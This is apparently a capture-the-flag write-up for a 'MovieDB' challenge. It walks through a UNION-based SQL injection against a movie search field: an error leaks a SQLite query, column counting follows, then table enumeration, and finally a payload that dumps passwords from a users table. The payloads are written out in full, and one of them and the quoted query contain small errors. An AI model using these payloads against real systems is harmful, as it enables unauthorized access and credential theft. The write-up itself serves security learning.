## Initial Exploration

The platform is a basic site that showcases movies using a search functionality.

!["site_initial"](assets/MovieDB/original_website.png)

The initial approach was to attempt an SQL injection. Consequently, I inserted a single quote into the search field to observe the response.

!["quote_error"](assets/MovieDB/quote_error.png)

Inserting a quote caused the site to throw an error, revealing the SQL query executed by the backend.

```sql
SELECT * FROM movies name LIKE '%{title}'
```

This error also gived the information that this website was powered up by sqlite.

Now that we had most of the needed informations, it was time for exploiting the vulnerability.

## Vulnerability Exploitation

The challenge description stated that we needed to gain admin access. To achieve this, I first wanted to list all the tables in the database.

The most straightforward method was to employ a UNION-based SQL injection. This form of injection leverages the UNION clause, allowing the concatenation of results from multiple SELECT statements, provided they return an equal number of columns.

So, I needed to determine the number of columns returned by the SQL query we discovered earlier. To do this, I used the payload:

```sql
' union SELECT 1,2,3,... -- -
```

I incremented the number of columns one by one until the query executed successfully.

!["sql1"](assets/MovieDB/sql1.PNG)

As we can see, the payload

```sql
' UNION SELECT 1,2,3,4,5,6 -- -
```
didn't return an error, so I could assume that there were 6 columns in the movies table.

With the number of columns determined, I proceeded to enumerate the tables. In SQLite, all tables can be listed using:

```sql
SELECT name FROM sqlite_schema WHERE type ='table' AND name NOT LIKE 'sqlite%';
```

Adjusting it to our payload, it becomes:

```sql
' UNION SELECT name, 2, 3, 4, 5, 6 FROM sqliteschema WHERE type ='table' AND name NOT LIKE 'sqlite%';
```

As expected, I found the table movies, but another one appeared, called users.

Next, I attempted to retrieve data from the users table. To do this, I reused our UNION-based SQL injection payload:

```sql
' union select password,2,1,2,3,4 from users -- -
```

And here we obtained the flag.
